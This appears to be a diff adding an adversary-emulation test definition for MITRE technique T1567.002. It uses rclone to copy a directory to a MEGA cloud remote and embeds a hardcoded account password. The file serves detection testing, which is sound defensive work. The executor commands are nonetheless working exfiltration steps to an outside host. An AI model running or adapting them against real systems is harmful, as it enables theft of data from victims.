@@ -1,0 +1,44 @@
+attack_technique: T1567.002
+display_name: Exfiltration Over Web Service to Cloud Storage
+atomic_tests:
+- name: Exfil data with rclone (Windows)
+  description: |
+    This test uses rclone to exfiltrate data to a remote cloud storage instance.
+    See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
+  supported_platforms:
+  - windows
+  input_arguments:
+    rclone_path:
+      description: Directory of rclone.exe
+      type: Path
+      default: $env:temp\T1567.002\rclone-v*\
+    dir_to_copy:
+      description: Directory to copy
+      type: String
+      default: $env:temp\T1567.002
+    remote_share:
+      description: Remote mega share
+      type: String
+      default: T1567002	 
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      rclone must exist at (#{rclone_path})
+    prereq_command: |
+      if (Test-Path #{rclone_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile $env:temp\rclone.zip
+      Expand-archive -path $env:temp\rclone.zip -destinationpath $env:temp\T1567.002\ -force
+  executor:
+    command: |
+     cd #{rclone_path}
+     .\rclone.exe config create #{remote_share} mega env_auth true user sparky pass GbS3QMe5O7FpjOFFR2pBea6FVFugxSgT
+     .\rclone.exe copy -P #{dir_to_copy} #{remote_share}: --no-check-certificate
+    cleanup_command: |
+     cd #{rclone_path}
+     .\rclone.exe delete #{remote_share}
+     .\rclone.exe config delete #{remote_share}
+     remove-item $env:temp\rclone.zip
+     remove-item #{dir_to_copy} -recurse -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: false
